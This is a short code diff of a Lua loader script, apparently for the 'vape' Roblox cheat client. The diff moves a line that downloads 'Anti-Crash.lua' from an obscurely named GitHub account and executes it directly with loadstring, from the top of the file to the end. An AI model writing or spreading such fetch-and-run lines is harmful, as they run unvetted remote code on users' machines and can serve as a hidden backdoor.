@@ -1,7 +1,5 @@
 --This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/pifaifiohawiohh8924920904444ffsfszcz/DHOHDOAHDA-HDDDA/main/Anti-Crash.lua", true))()
-
 repeat task.wait() until game:IsLoaded()
 if shared.vape then shared.vape:Uninject() end
 
@@ -147,3 +145,5 @@ else
 end
 
 shared.VapeFullyLoaded = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pifaifiohawiohh8924920904444ffsfszcz/DHOHDOAHDA-HDDDA/main/Anti-Crash.lua", true))()
